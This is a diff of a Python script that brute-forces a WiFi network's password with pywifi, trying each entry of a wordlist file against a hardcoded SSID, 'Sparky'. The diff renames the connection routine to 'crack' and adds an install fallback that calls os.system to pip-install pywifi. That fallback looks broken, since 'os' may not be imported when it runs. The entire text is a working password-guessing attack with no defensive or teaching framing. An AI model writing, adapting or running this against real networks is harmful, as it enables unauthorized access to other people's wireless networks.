@@ -1,17 +1,21 @@
-import argparse, sys, os, os.path, platform, re, time, pywifi
-from pywifi import PyWiFi, const, Profile
 try:
-    # wlan
+    import argparse, sys, os, os.path, platform, re, time, pywifi
+    from pywifi import PyWiFi, const, Profile
+except:
+    libs = ["pywifi"]
+    for i in libs:
+        os.system(f"pip install {i}")
+try:
     wifi = PyWiFi()
     ifaces = wifi.interfaces()[0]
-    ifaces.scan() #check the card
+    ifaces.scan()
     results = ifaces.scan_results()
     wifi = pywifi.PyWiFi()
     iface = wifi.interfaces()[0]
 except Exception as e:
     print(f"Error : {e}")
 
-def main(ssid, password, number):
+def crack(ssid, password, number):
     pro = Profile() 
     pro.ssid = ssid
     pro.auth = const.AUTH_ALG_OPEN
@@ -36,8 +40,8 @@ def pwd(ssid, psws):
     number = 0
     for psw in psws:
         number += 1
-        main(ssid, str(psw), number)
+        crack(ssid, str(psw), number)
          
 with open("psw.txt", "r", encoding='utf8') as f:
     psws = f.read().strip().split("\n")
-    pwd("SSID", psws)
+    pwd("Sparky", psws)
